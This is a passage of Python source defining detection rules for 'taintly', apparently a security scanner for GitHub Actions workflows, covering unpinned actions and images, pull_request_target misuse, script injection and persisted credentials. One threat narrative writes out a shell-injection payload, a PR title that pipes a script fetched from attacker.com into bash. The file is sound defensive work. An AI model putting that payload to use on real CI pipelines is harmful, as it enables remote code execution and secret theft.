            # aquasecurity/setup-trivy (< 0.2.6) — same advisory.
            "      - uses: aquasecurity/setup-trivy@v0.2.0",
            # Trivy script-injection (>= 0.31.0, < 0.34.0).
            "      - uses: aquasecurity/trivy-action@v0.32.5",
        ],
        test_negative=[
            # Patched versions of the same actions — must NOT fire.
            "      - uses: tj-actions/changed-files@v46.0.1",
            "      - uses: tj-actions/changed-files@v45.0.8",
            "      - uses: aquasecurity/trivy-action@v0.35.0",
            "      - uses: aquasecurity/setup-trivy@v0.2.6",
            # Other actions entirely — never in advisory list.
            "      - uses: actions/checkout@v4",
            "      - uses: actions/setup-python@v5",
            # Local action and docker — excluded by patterns.
            "      - uses: ./local-action",
            "      - uses: docker://alpine:3.18",
            # Comment.
            "      # uses: tj-actions/changed-files@v40",
            # SHA pin — unparseable ref, conservatively does not fire.
            "      - uses: tj-actions/changed-files@a3b5c8d9e0f1234567890abcdef0123456789abcd",
            # Branch ref — unparseable, does not fire (SEC3-GH-002 covers).
            "      - uses: tj-actions/changed-files@main",
        ],
        stride=["T", "I", "E"],
        threat_narrative=(
            "An attacker who compromises a popular GitHub Action can "
            "exfiltrate every secret bound to every workflow that "
            "references it — across every consumer repository — for "
            "the duration of the attack window.  The "
            "tj-actions/changed-files March 2025 incident leaked "
            "secrets from thousands of public repositories within a "
            "single attack window because the malicious version was "
            "force-pushed onto the existing ``@v40`` / ``@v44`` mutable "
            "tags.  Pinning to a SHA published BEFORE the compromise "
            "does not save you if the SHA's content was rewritten in "
            "place via tag manipulation."
        ),
        incidents=[
            "tj-actions/changed-files (Mar 2025) — GHSA-mrrh-fwg8-r2c3",
            "tj-actions/changed-files (GHSL-2023-271) — GHSA-mcph-m25j-8j63",
            "Reviewdog (Mar 2025) — GHSA-qmg3-hpqr-gqvc",
            "Trivy supply chain (Mar 2026) — GHSA-69fq-xp46-6x23",
            "Trivy script-injection — GHSA-9p44-j4g5-cfx5",
        ],
    ),
    # =========================================================================
    # SEC3-GH-006 — third-party action inventory (review-needed)
    # =========================================================================
    #
    # Fires INFO once per ``uses: <pkg>@<ref>`` where ``<pkg>`` is NOT
    # under one of the trusted GitHub-published orgs (``actions/``,
    # ``github/``).  Built for the ``--baseline`` / ``--diff`` workflow:
    # initial scan lists every external dependency for one-time review;
    # subsequent scans surface only NEW dependencies as diff entries.
    #
    # Distinct from SEC3-GH-003 (always-fire on packages with confirmed
    # compromise history) and SEC3-GH-004 (fire on actually-vulnerable
    # versions): inventory has zero implicit threat assessment — it
    # surfaces the dependency surface so a human can decide.
    Rule(
        id="SEC3-GH-006",
        title="Third-party action used (inventory; review-needed)",
        severity=Severity.INFO,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-3",
        review_needed=True,
        finding_family="Mutable dependency references",
        description=(
            "The workflow references a GitHub Action published outside "
            "the official ``actions/`` and ``github/`` organisations. "
            "External actions are supply-chain dependencies — every "
            "release ships executable code that runs with your "
            "workflow's full permissions and bound secrets.  Use "
            "``--baseline`` to snapshot the current set of third-party "
            "actions and ``--diff`` on subsequent scans to surface only "
            "new dependencies that need review.  Trusted-default orgs: "
            "``actions``, ``github``."
        ),
        pattern=RegexPattern(
            # uses: <org>/<repo>[/<sub>]@<ref>
            # — match orgs OTHER than actions/ and github/.
            # Negative lookahead anchors on the slash to prevent
            # matching ``actions-foundation/`` etc. as also-trusted.
            match=r"^\s*-?\s*uses:\s*(?!actions/)(?!github/)(?!\./)(?!\.\./)(?!docker://)([\w.-]+/[\w./-]+)@(\S+)",
            exclude=[
                r"^\s*#",
            ],
        ),
        remediation=(
            "Each finding is the *first* occurrence of an external "
            "action in this scan; review the action's repository, "
            "publisher, and recent commits, then snapshot the inventory "
            "with ``--baseline``.  After baseline, only NEW external "
            "actions surface in ``--diff`` output.  If your organisation "
            "publishes its own actions under a stable namespace and you "
            "trust them, suppress with ``# taintly: ignore[SEC3-GH-006]`` "
            "on the line, or add a path-scoped ignore in ``.taintly.yml``."
        ),
        reference="https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-third-party-actions",
        test_positive=[
            "      - uses: tj-actions/changed-files@v40",
            "      - uses: aquasecurity/trivy-action@v0.35.0",
            "      - uses: peter-evans/find-comment@v3",
            "      - uses: docker/build-push-action@v5",
            "      - uses: codecov/codecov-action@v3",
        ],
        test_negative=[
            # Trusted: actions/* and github/*.
            "      - uses: actions/checkout@v4",
            "      - uses: actions/setup-python@v5",
            "      - uses: github/codeql-action/init@v3",
            # Local action — not a third-party dependency.
            "      - uses: ./local-action",
            "      - uses: ../shared-action",
            # Docker image — separate concern, not in scope here.
            "      - uses: docker://alpine:3.18",
            # Comment.
            "      # uses: tj-actions/changed-files@v40",
        ],
        stride=["T"],
        threat_narrative=(
            "Third-party GitHub Actions execute with the workflow's "
            "full GITHUB_TOKEN scope and bound secrets at the time the "
            "workflow runs.  Every external action is supply-chain "
            "surface: a force-pushed tag, a maintainer takeover, or a "
            "compromised publisher account turns into immediate "
            "execution in your build environment.  This rule does not "
            "claim any specific action is malicious — it surfaces the "
            "external dependency set so a human reviewer can make the "
            "trust decision for each one, with ``--baseline`` / "
            "``--diff`` ensuring new additions don't slip through."
        ),
        confidence="medium",
    ),
    Rule(
        id="SEC3-GH-005",
        title="Docker container action without digest pinning",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-3",
        description=(
            "Docker image referenced by tag instead of SHA256 digest. Image tags are mutable "
            "and can be overwritten on the registry."
        ),
        pattern=RegexPattern(
            match=r"(image|uses):\s*docker://[^@\s]+(?!.*@sha256:)",
            exclude=[r"^\s*#", r"@sha256:"],
        ),
        remediation="Pin Docker images to digest: docker://alpine@sha256:abcdef...",
        reference="https://docs.docker.com/reference/cli/docker/image/pull/#pull-an-image-by-digest-immutable-identifier",
        test_positive=[
            "      uses: docker://alpine:3.18",
            "      image: docker://node:20-slim",
        ],
        test_negative=[
            "      uses: docker://alpine@sha256:abcdef1234567890abcdef1234567890",
            "      # uses: docker://alpine:3.18",
        ],
        stride=["T"],
        threat_narrative=(
            "Image tags are mutable pointers: registry operators or attackers who compromise the "
            "image repository can push a new image under the same tag, replacing your job's execution "
            "environment without any visible change in your workflow file. "
            "A compromised container image executes with full access to all runner secrets, "
            "source code, and build artifacts."
        ),
    ),
    # =========================================================================
    # CICD-SEC-4: Poisoned Pipeline Execution
    # =========================================================================
    Rule(
        id="SEC4-GH-001",
        title="pull_request_target with untrusted PR checkout",
        severity=Severity.CRITICAL,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "Workflow uses pull_request_target AND checks out the PR author's code. "
            "This is the exact attack vector used in the Trivy supply chain compromise (March 2026). "
            "Attacker-controlled code executes with access to repo secrets and write permissions. "
            "The ``head.sha`` and ``head.ref`` checkout variants — explicitly checking out the "
            "PR's head commit via ``actions/checkout`` with ``ref: ${{ github.event."
            "pull_request.head.sha }}`` (or ``head.ref``) — produce the same imposter-trigger "
            "shape and are covered by this rule's requires regex."
        ),
        pattern=ContextPattern(
            anchor=r"pull_request_target",
            requires=r"github\.event\.pull_request\.head\.(sha|ref)",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Use 'pull_request' trigger instead. If secrets are required, use a two-workflow "
            "pattern: pull_request for build/test, workflow_run for privileged operations."
        ),
        reference="https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/",
        test_positive=[
            "on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}",
        ],
        test_negative=[
            "on:\n  pull_request:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4",
            "on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - run: echo 'just a comment'",
        ],
        stride=["E", "I"],
        threat_narrative=(
            "pull_request_target runs with the base repository's write permissions and full secret "
            "access, and checking out the PR author's code gives an external contributor arbitrary "
            "code execution in that privileged context. "
            "This is the exact pattern exploited in the March 2026 Trivy supply chain attack to "
            "exfiltrate repository secrets at scale from thousands of repositories."
        ),
        incidents=["Trivy supply chain (Mar 2026)", "Ultralytics (Dec 2024)"],
    ),
    Rule(
        id="SEC4-GH-002",
        title="pull_request_target trigger detected",
        # Severity is MEDIUM (not HIGH).  SEC4-GH-002 is the
        # BARE-TRIGGER signal (already in ``_REVIEW_NEEDED_RULES``
        # per families.py).  The actually-dangerous combination —
        # pull_request_target + checkout-of-PR-code — is covered
        # by SEC4-GH-001 [CRITICAL].  Bare-trigger detection at
        # MEDIUM keeps the signal visible without crowding the
        # HIGH bucket with known-safe trigger usage.  SEC4-GH-001
        # still escalates the
        # dangerous combination to CRITICAL.
        severity=Severity.MEDIUM,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "Workflow uses pull_request_target which runs with write access to the base repo "
            "and access to secrets. Even without PR checkout, this trigger is inherently risky. "
            "Any future modification could introduce a PPE vulnerability. "
            "If the workflow also checks out PR code, SEC4-GH-001 escalates to CRITICAL."
        ),
        pattern=RegexPattern(
            # FP-audit class A: bare substring matched
            # ``pull_request_target`` ANYWHERE in the file, including
            # inside defensive conditionals like ``github.event_name ==
            # 'pull_request_target'`` (which routes untrusted triggers
            # to safe code paths — the OPPOSITE of vulnerable).
            # Restrict to trigger-declaration shapes: block-form key,
            # list element, inline-form value, or list-shorthand.
            match=(
                r"^\s*pull_request_target\s*:"  # block-form key
                r"|^\s*-\s*pull_request_target\s*$"  # YAML list item
                r"|^on\s*:\s*pull_request_target\s*$"  # inline form
                r"|^on\s*:\s*\[[^\]]*\bpull_request_target\b[^\]]*\]"  # list shorthand
            ),
            exclude=[r"^\s*#"],
        ),
        remediation="Use 'pull_request' trigger if write access is not required.",
        reference="https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/",
        test_positive=[
            "  pull_request_target:",
            "    pull_request_target:",
            "on: [pull_request_target]",
        ],
        test_negative=[
            "  pull_request:",
            "  # pull_request_target:",
            # FP-audit: defensive conditional that mentions the trigger
            # name as a string-literal comparand, NOT as a trigger.
            "ref: ${{ (github.event_name == 'pull_request_target') && 'main' || github.sha }}",
            "# fallback if event is pull_request_target",
            'echo "event=$EVENT_NAME pull_request_target=$PRT"',
        ],
        stride=["E"],
        threat_narrative=(
            "pull_request_target grants write repository access and exposes secrets to all workflow "
            "steps, unlike pull_request which runs in a read-only context. "
            "Even without explicit PR code checkout today, any future careless modification of this "
            "workflow — such as adding actions/checkout — becomes a critical PPE vulnerability."
        ),
        incidents=["Trivy supply chain (Mar 2026)"],
    ),
    Rule(
        id="SEC4-GH-003",
        title="workflow_run without conclusion check",
        severity=Severity.MEDIUM,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "Workflow triggers on workflow_run but doesn't verify the triggering workflow "
            "succeeded. May process tainted artifacts from failed/compromised workflows."
        ),
        pattern=ContextPattern(
            # The anchor matches the ``workflow_run`` trigger
            # DECLARATION line only, not every reference to
            # ``github.event.workflow_run.*`` later in the file.
            # Without this, the rule emits one finding per property
            # reference on a non-gated workflow_run-triggered job —
            # the missing conclusion gate is one bug, not N.
            #
            # Three accepted shapes:
            #   block-form key       ``  workflow_run:``
            #   inline shorthand     ``on: workflow_run``  (end-of-line)
            #   list form            ``on: [workflow_run, push]``
            #
            # The negative lookbehind ``(?<![.\w])`` rejects property
            # references like ``${{ github.event.workflow_run.* }}``
            # (preceded by ``.``) and identifiers that happen to end
            # in ``workflow_run`` (preceded by a word char).
            anchor=r"(?<![.\w])workflow_run\s*(?::|,|\]|$)",
            # FP-audit class A: bare ``workflow_run`` substring in
            # ``requires`` matched step names like
            # ``Trigger scheduled AMD CI via workflow_run`` and echo
            # bodies — content, not triggers.  Tighten to require a
            # real trigger-declaration shape.  ``(?m)`` because
            # ContextPattern compiles regexes without MULTILINE.
            requires=(
                r"(?m)("
                r"^\s*workflow_run\s*:"
                r"|^\s*-\s*workflow_run\s*$"
                r"|^on\s*:\s*workflow_run\s*$"
                r"|^on\s*:\s*\[[^\]]*\bworkflow_run\b[^\]]*\]"
                r")"
            ),
            requires_absent=r"workflow_run\.conclusion",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Gate the triggered job on the upstream conclusion AND treat every artefact "
            "from the triggering workflow as untrusted — a successful `workflow_run` can "
            "still receive head_sha / artefacts produced by fork code:\n"
            "\n"
            "jobs:\n"
            "  deploy:\n"
            "    if: github.event.workflow_run.conclusion == 'success'\n"
            "    steps:\n"
            "      # Check out the BASE repo SHA, not github.event.workflow_run.head_sha\n"
            "      - uses: actions/checkout@<pinned-sha>\n"
            "        with:\n"
            "          ref: ${{ github.event.workflow_run.head_repository.default_branch }}\n"
            "      # Download artefacts into a scratch dir and validate before use\n"
            "      - uses: actions/download-artifact@<pinned-sha>\n"
            "        with:\n"
            "          path: ./untrusted/\n"
            "      - run: ./scripts/validate-artifacts.sh ./untrusted/\n"
            "\n"
            "See the GitHub Security Lab write-up on preventing `workflow_run` pwn "
            "requests for the full threat model."
        ),
        reference="https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/",
        test_positive=[
            "on:\n  workflow_run:\n    workflows: [Build]\n    types: [completed]\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - run: deploy.sh",
        ],
        test_negative=[
            "on:\n  push:\njobs:\n  build:\n    runs-on: ubuntu-latest",
            "on:\n  workflow_run:\n    workflows: [Build]\n    types: [completed]\njobs:\n  deploy:\n    if: github.event.workflow_run.conclusion == 'success'\n    runs-on: ubuntu-latest",
        ],
        stride=["T"],
        threat_narrative=(
            "Processing artifacts from a failed or inconclusive upstream workflow may consume "
            "build outputs produced under compromised or partial conditions. "
            "An attacker who can trigger the upstream workflow to fail after partially completing "
            "can produce tainted artifacts that the privileged downstream workflow then ships."
        ),
    ),
    Rule(
        id="SEC4-GH-004",
        title="Script injection via attacker-controlled GitHub context",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "User-controlled value injected directly into a run: block via ${{ }} expression. "
            "Attacker can craft PR titles, issue bodies, branch names, or commit messages "
            "containing shell commands that execute in the runner context."
        ),
        # Structural form scopes the query to ``run:`` keys
        # directly — the path filter does the structural job that
        # the regex form's excludes (comment, ``if:`` context,
        # whole-expression-passthrough) were approximating.  Inside
        # multi-line ``run: |`` block scalars the rule fires once
        # at the block-header line rather than once per dangerous
        # interpolation, by design.
        pattern=StructuralPattern(
            path="**.run",
            predicate=_has_dangerous_github_context,
        ),
        remediation=(
            "Pass the value through an environment variable so the "
            "${{ }} interpolation expands into the runner's env map, "
            "not into the generated step script:\n"
            "env:\n  TITLE: ${{ github.event.pull_request.title }}\n"
            'run: echo "$TITLE"\n'
            "For values passed to downstream tools that interpret their "
            "input (git, url construction, sqlite), validate against an "
            "allowlist after the env-var step. Run "
            "`taintly --guide SEC4-GH-004` for the full "
            "injection-vs-downstream-sanitization model."
        ),
        reference="https://securitylab.github.com/resources/github-actions-untrusted-input/",
        test_positive=[
            '        run: echo "${{ github.event.pull_request.title }}"',
            '        run: echo "${{ github.event.issue.body }}"',
            "        run: git checkout ${{ github.head_ref }}",
            "        run: git checkout ${{ github.event.pull_request.head.ref }}",
            '        run: echo "${{ github.event.pull_request.head.label }}"',
            '        run: echo "${{ github.event.pull_request.user.login }}"',
        ],
        test_negative=[
            '        if: github.event.pull_request.title != ""',
            '        run: echo "$TITLE"',
            '        # run: echo "${{ github.event.pull_request.title }}"',
            # ref: in a with: block is an action string param, not a shell command
            "        with:\n          ref: ${{ github.head_ref }}",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "An attacker can craft a PR title, issue body, or branch name containing shell "
            "metacharacters — such as `'; curl attacker.com/c2.sh | bash #` — that execute as "
            "commands when the value is interpolated into a run: block. "
            "The injected commands run with the workflow's full permissions including write access "
            "and all bound secrets."
        ),
        incidents=["Ultralytics (Dec 2024)", "Langflow (2024)"],
    ),
    Rule(
        id="SEC4-GH-005",
        title="Checkout persists credentials AND a downstream step consumes them",
        # Tightened from "fires on every actions/checkout without
        # persist-credentials: false" to "fires only when a downstream
        # step in the same job actually uses the persisted credential"
        # (git push/fetch/config or a documented git-pushing action).
        # Severity is MEDIUM because remaining fires are real risk,
        # not posture-density noise.  See
        # _CheckoutDownstreamCredentialConsumerPattern above for the
        # consumer detector.
        severity=Severity.MEDIUM,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "actions/checkout persists the GITHUB_TOKEN by default "
            "(`persist-credentials: true`). v4+ writes the token into a helper file "
            "under $RUNNER_TEMP and configures `.git/config` to reference it, so any "
            "subsequent step — including third-party actions — can read the token off "
            "disk and reuse it against the GitHub API without going through the secrets "
            "facility. This rule fires only when a downstream step in the same job "
            "actually consumes that credential — a `git push` / `git fetch <url>` / "
            "`git config user` shell op, or a documented git-pushing action "
            "(peaceiris/actions-gh-pages, ad-m/github-push-action, "
            "stefanzweifel/git-auto-commit-action, EndBug/add-and-commit, etc.). "
            "Set `persist-credentials: false` on the checkout step (or scope the "
            "downstream push to its own minimal-permissions checkout)."
        ),
        pattern=_CheckoutDownstreamCredentialConsumerPattern(),
        remediation="Add 'persist-credentials: false' to the checkout step.",
        reference="https://github.com/actions/checkout#usage",
        test_positive=[
            # Checkout + downstream git push in the same job.
            (
                "jobs:\n  publish-pages:\n    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - uses: actions/checkout@v4\n"
                "      - run: |\n"
                "          git config user.email bot@example.com\n"
                "          git push origin gh-pages\n"
            ),
            # Checkout + a documented git-pushing action.
            (
                "jobs:\n  publish:\n    runs-on: ubuntu-latest\n"
                "    steps:\n"
                "      - uses: actions/checkout@v4\n"
                "      - uses: peaceiris/actions-gh-pages@v3\n"
                "        with:\n          publish_dir: ./public\n"
            ),
        ],
        test_negative=[
            # persist-credentials: false explicitly.
            (
                "jobs:\n  build:\n    runs-on: ubuntu-latest\n"
                "    steps:\n      - uses: actions/checkout@v4\n"
                "        with:\n          persist-credentials: false\n"
                "      - run: git push origin main\n"
            ),
            # Checkout-only; no downstream consumer — used to fire LOW,
            # now silent under the consumer-required tune.
            (
                "jobs:\n  test:\n    runs-on: ubuntu-latest\n"
                "    steps:\n      - uses: actions/checkout@v4\n"
                "      - run: pytest\n"
            ),
            # Cross-job: sibling job pushes, but THIS job doesn't.
            (
                "jobs:\n  test:\n    runs-on: ubuntu-latest\n"
                "    steps:\n      - uses: actions/checkout@v4\n"
                "      - run: pytest\n"
                "  publish:\n    runs-on: ubuntu-latest\n"
                "    needs: test\n"
                "    steps:\n      - uses: actions/checkout@v4\n"
                "        with:\n          persist-credentials: false\n"
                "      - run: git push\n"
            ),
        ],
        stride=["I", "T"],
        threat_narrative=(
            "The GITHUB_TOKEN persisted by actions/checkout (stored in a file under "
            "$RUNNER_TEMP and referenced from .git/config on v4+) can be read by any "
            "subsequent step — including third-party actions — from the filesystem "
            "without any secrets API call. With write repository permissions, a token "
            "extracted this way can push malicious commits, modify branch protections, "
            "or inject code into other workflows.  The risk is concrete only when a "
            "downstream step actually uses the credential; this rule scopes to that "
            "case to keep the signal-to-noise ratio actionable."
        ),
    ),
    # =========================================================================
    # SEC4-GH-005B: posture sibling of SEC4-GH-005.
    # =========================================================================
    Rule(
        id="SEC4-GH-005B",
        title="Checkout persists credentials under fork-reachable trigger (posture)",
        severity=Severity.INFO,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "actions/checkout persists the GITHUB_TOKEN by default "
            "(`persist-credentials: true`).  Under a fork-reachable "
            "trigger (`pull_request` / `pull_request_target` / "
            "`issue_comment` / `workflow_run`), the persisted token "
            "is reachable by any subsequent step in the same job, "
            "including third-party actions whose runtime behavior "
            "isn't fully audited at workflow-author time.\n"
            "\n"
            "This rule is a posture sibling of SEC4-GH-005: it fires "
            "INFO + review_needed when a fork-reachable workflow's "
            "checkout doesn't set `persist-credentials: false` and "
            "no in-job credential consumer was detected.  The risk "
            "is residual (a future/third-party step *might* read the "
            "token), not confirmed — SEC4-GH-005 owns the confirmed-"
            "consumer case at MEDIUM.\n"
            "\n"
            "Why a separate rule and not a SEC4-GH-005 severity "
            "downgrade?  SEC4-GH-005's May-17 precision tune removed "
            "~80% FP-density noise by requiring a proven consumer.  "
            "Re-enabling the bare-checkout firing on a downgraded "
            "severity would undo the tune.  This sibling gates on "
            "fork-reachable trigger to keep the surface narrow "
            "without losing operator visibility on the residual case."
        ),
        pattern=_CheckoutNoPersistPostureSiblingPattern(),
        remediation=(
            "Either:\n"
            "  1. Add `persist-credentials: false` to the checkout step "
            "(strongly preferred for fork-reachable workflows).\n"
            "  2. If a downstream step legitimately uses the persisted "
            "credential, accept the MEDIUM-severity SEC4-GH-005 "
            "finding instead by adding the consumer explicitly (a "
            "`git push` step or one of the documented git-pushing "
            "actions).\n"
            "  3. If neither applies, suppress this rule for the "
            "workflow via `.taintly.yml` with a documented rationale."
        ),
        reference="https://github.com/actions/checkout#usage",
        test_positive=[
            # Fork-reachable trigger, checkout without persist-creds: false,
            # NO downstream consumer.  Posture sibling fires.
            (
                "on:\n  pull_request: {}\n"
                "jobs:\n  test:\n    runs-on: ubuntu-latest\n"
                "    steps:\n      - uses: actions/checkout@v4\n"
                "      - run: pytest\n"
            ),
            # pull_request_target — same shape, different trigger.
            (
                "on:\n  pull_request_target: {}\n"
                "jobs:\n  triage:\n    runs-on: ubuntu-latest\n"
                "    steps:\n      - uses: actions/checkout@v4\n"
                "      - run: echo hello\n"
            ),
        ],
        test_negative=[
            # persist-credentials: false on the checkout — safe.
            (
                "on:\n  pull_request: {}\n"
                "jobs:\n  test:\n    runs-on: ubuntu-latest\n"
                "    steps:\n      - uses: actions/checkout@v4\n"
                "        with:\n          persist-credentials: false\n"
                "      - run: pytest\n"
            ),
            # Push-only trigger — not fork-reachable, SEC4-GH-005B does
            # not fire even with bare checkout.
            (
                "on:\n  push:\n    branches: [main]\n"
                "jobs:\n  release:\n    runs-on: ubuntu-latest\n"
                "    steps:\n      - uses: actions/checkout@v4\n"
                "      - run: make release\n"
            ),
            # Fork-reachable + downstream consumer → SEC4-GH-005's
            # territory; SEC4-GH-005B must NOT co-fire.
            (
                "on:\n  pull_request: {}\n"
                "jobs:\n  publish:\n    runs-on: ubuntu-latest\n"
                "    steps:\n      - uses: actions/checkout@v4\n"
                "      - run: git push origin gh-pages\n"
            ),
        ],
        stride=["I"],
        threat_narrative=(
            "A maintainer adds `actions/checkout` to a fork-reachable "
            "workflow (PR validation / triage) but doesn't set "
            "`persist-credentials: false`.  No current step uses the "
            "token, so SEC4-GH-005 stays silent.  Six months later a "
            "third-party action is added to the job — say a coverage "
            "uploader — that reads the `.git/config` token reference "
            "and exfiltrates it to the action's server.  The risk "
            "wasn't latent when the workflow was written; it became "
            "latent when the action was added.  This rule's INFO "
            "signal surfaces the posture so reviewers can decide "
            "whether to harden the checkout before that future risk."
        ),
        review_needed=True,
    ),
    # =========================================================================
    # SEC3-GH-007: Docker image reference (services.<name>.image: or
    # container.image:) without SHA256 digest pin.
    #
    # GitHub-side counterpart of SEC3-GL-005.  The cross-tool corpus
    # (88 labelled rows across 12 repos) measured taintly's
    # ``unpinned_image`` recall at 0.25 vs zizmor's 0.75 — every miss
    # was a GitHub workflow with a tag-pinned ``services.<svc>.image:``
    # block (postgres, redis, etc.).  This rule closes that gap.
    #
    # Same pattern as the GitLab rule: ``image: <name>:<tag>`` fires
    # when no ``@sha256:`` digest is present.  Excludes commented-out
    # lines and digests-with-tags (``alpine:3.18@sha256:abc...``).
    # =========================================================================
    Rule(
        id="SEC3-GH-007",
        title="Docker service / container image without digest pinning",
        severity=Severity.MEDIUM,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-3",
        description=(
            "A GitHub Actions workflow references a Docker image by tag "
            "(``image: postgres:15``) under a ``services.<name>:`` or "
            "top-level ``container:`` block.  Image tags are mutable: a "
            "registry push under the same tag silently swaps what runs "
            "alongside or as the host of every job.  Pin to an immutable "
            "SHA256 digest so the registry can't change the bytes "
            "executed by a future workflow run."
        ),
        pattern=RegexPattern(
            # Match `image: <name>[:<tag>]` lines that don't contain
            # a digest reference.  The trailing ``\s*$`` (with optional
            # comment) anchors at end-of-line so we don't match
            # ``image: foo  # comment`` style annotations partial-way.
            # Allow expressions in the tag portion (``:${{ matrix.x }}``)
            # — those still resolve to a mutable tag at runtime.
            match=r"^\s*image:\s*['\"]?[a-zA-Z0-9._/-]+(?::[a-zA-Z0-9._${}\s-]+)?['\"]?\s*(#.*)?$",
            exclude=[
                r"^\s*#",
                # Digest pin in any position on the line — safe.
                r"@sha256:",
                # Bare ``image:`` block opener (no value on same line).
                r"^\s*image:\s*$",
            ],
        ),
        remediation=(
            "Pin the image to a SHA256 digest:\n"
            "  services:\n"
            "    postgres:\n"
            "      image: postgres@sha256:abcdef...\n"
            "Resolve the digest with ``docker buildx imagetools inspect``\n"
            "or ``crane digest <image>:<tag>`` and Renovate / Dependabot\n"
            "can keep it current."
        ),
        reference="https://docs.docker.com/reference/cli/docker/image/pull/#pull-an-image-by-digest-immutable-identifier",
        test_positive=[
            "      image: postgres:15-alpine",
            "      image: redis:6",
            "      image: postgis/postgis:${{ matrix.postgis-version }}",
            "      image: 'ghcr.io/example/app:latest'",
        ],
        test_negative=[
            "      image: postgres@sha256:abcdef1234567890",
            "      image: alpine:3.18@sha256:abcdef1234567890",
            "      # image: postgres:15-alpine",
            "    image:",  # bare opener — not a pin reference
        ],
        stride=["T"],
        threat_narrative=(
            "An attacker who controls the upstream registry image (compromised "
            "publisher, account takeover, typosquat under a similar tag) can "
            "replace the bytes pulled by your jobs without changing the workflow "
            "file.  Service containers run alongside the job with access to job "
            "secrets via service ``env:`` and shared ``volumes``; container-runtime "
            "jobs (``container.image:``) run AS that image.  Pinning to a SHA256 "
            "digest makes the image reference immutable and breaks this attack."
        ),
        incidents=[
            # No high-profile published incident specifically for GitHub Actions
            # services-image swaps yet; the threat is the same shape as
            # ``actions/*@v4`` tag mutability (SEC3-GH-001) and the
            # general Docker-image-tag attack class.
        ],
    ),
    # =========================================================================
    # SEC3-GH-009: Imposter commit (SHA pinned to an orphan commit)
    # =========================================================================
    Rule(
        id="SEC3-GH-009",
        title="Action pinned to a SHA that is not reachable from any ref",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-3",
        description=(
            "A ``uses: owner/repo@<sha>`` reference is pinned to a "
            "40-character hex SHA, but the SHA is not reachable from any "
            "ref (branch, tag, or open PR) in the action's repository.  "
            "Two scenarios produce this state: (1) the maintainer "
            "force-pushed over the tag the SHA originally pointed at, "
            "leaving the SHA orphaned; (2) the SHA was published "
            "transiently and later garbage-collected.  Either way, the "
            "SHA no longer has the ref-history audit trail that "
            "originally produced it.  A future ref recreation could "
            "rebind the SHA to attacker-controlled content with no "
            "warning to consumers.\n"
            "\n"
            "This rule is opt-in via ``--check-imposter-commits`` "
            "because verification requires a per-action GitHub API "
            "call; documentation recommends running it on a weekly "
            "cron rather than on every PR build."
        ),
        pattern=ImposterCommitPattern(),
        remediation=(
            "Confirm with the action's maintainers whether the SHA was\n"
            "intentionally orphaned.  If it was, repin to a current\n"
            "tag-reachable SHA and document the rotation.  If the\n"
            "maintainers do not respond, treat the action as untrusted\n"
            "and pin to a fork at a vetted SHA under your own account.\n"
            "\n"
            "Run ``taintly --guide SEC3-GH-009`` for the full checklist."
        ),
        reference=(
            "https://docs.github.com/en/actions/security-for-github-actions/"
            "security-guides/security-hardening-for-github-actions#using-third-party-actions"
        ),
        # Empty inline samples — verification requires a real or
        # stubbed verifier, exercised by tests/unit/test_imposter_commits.py.
        test_positive=[],
        test_negative=[],
        stride=["T", "S"],
        threat_narrative=(
            "An attacker who controls the action's repository (compromised "
            "maintainer account, account takeover) force-pushes the tag "
            "the SHA originally referenced.  The SHA itself remains "
            "valid for fetches until GitHub garbage-collects unreachable "
            "objects.  After GC, the SHA returns 404 — but consumers "
            "pinning to it have no automated way to learn that.  In the "
            "interim, an attacker who can recreate a ref pointing back "
            "at the SHA can also rebind it to fresh, attacker-supplied "
            "content if they win the race against GC."
        ),
        confidence="high",
        review_needed=True,
        finding_family="action_pin_drift",
    ),
    # =========================================================================
    # SEC3-GH-010: Archived action repository (opt-in, network-dependent)
    # =========================================================================
    Rule(
        id="SEC3-GH-010",
        title="Action references an archived GitHub repository",
        severity=Severity.MEDIUM,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-3",
        review_needed=True,
        confidence="high",
        description=(
            "A ``uses: owner/repo@<ref>`` reference points to a GitHub "
            "repository that is archived (read-only).  Archived repos "
            "receive no new releases, no security patches, and the "
            "maintainer is not actively monitoring compromise reports.  "
            "A vulnerability disclosed against an archived action is "
            "unlikely to be fixed; a maintainer-account compromise "
            "against an archived repo may go unnoticed indefinitely.\n"
            "\n"
            "This rule is opt-in via ``--check-archived-actions`` "
            "because verification requires a per-action GitHub API "
            "call (``GET /repos/{owner}/{repo}`` reading the "
            "``archived`` flag).  Recommended on a weekly cron rather "
            "than per-PR.  First-party orgs (``actions``, ``github``, "
            "``aws-actions``, ``azure``, etc.) are skipped — the "
            "platform vendors don't archive their own action repos."
        ),
        pattern=ArchivedActionPattern(),
        remediation=(
            "Migrate to a maintained fork or an alternative action that "
            "covers the same functionality.  Check the archived repo's "
            "README for a recommended successor; if none, search the "
            "GitHub Marketplace for actions with similar inputs.  If no "
            "alternative exists and the action is critical, fork it "
            "into your own org so security patches can be applied "
            "in-house — pinning to your fork's SHA makes the supply-"
            "chain explicit."
        ),
